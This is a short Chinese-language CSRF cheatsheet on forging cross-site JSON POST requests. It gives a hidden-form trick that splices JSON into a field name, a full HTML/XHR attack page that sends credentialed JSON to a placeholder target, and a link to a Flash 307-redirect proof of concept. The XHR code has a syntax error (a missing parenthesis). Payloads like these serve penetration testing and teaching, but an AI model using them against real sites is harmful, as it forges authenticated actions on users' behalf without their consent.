- [CSRF-Cheatsheet](#csrf-cheatsheet)
  - [JSON Post](#json-post)
    - [构造表单](#构造表单)
    - [XHR](#xhr)
    - [flash 307](#flash-307)

# CSRF-Cheatsheet
## JSON Post
### 构造表单
Post JSON数据格式的数据需要构造表单,把post数据作为参数名发送,最后还需要闭合多余的字符.  
`<input type="hidden" name='{"data":"300016001555","test":"' value='test"}' />`
但表单无法设置Content-Type为application/json,如果服务端校验Content-Type则会拒绝该请求.
### XHR
可以使用XHR提交来设置Content-Type,但该方式会先发生OPTIONS请求,要求服务端不会对该OPTIONS请求的Content-Type做检验,同时需要CORS.
```html
<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://www.xxxxx.com/AAA", true);
        xhr.setRequestHeader("Accept", "*/*");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
        xhr.withCredentials = true;
        xhr.send(JSON.stringify({"data":"300016001555","test":"test"});
    }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();"/>
    </form>
  </body>
</html>
```

### flash 307
通过Flash的跨域和307跳转来绕过限制,307跳转会保持原请求原封不动的进行转发,还是会受到CORS的限制.  
https://github.com/appsecco/json-flash-csrf-poc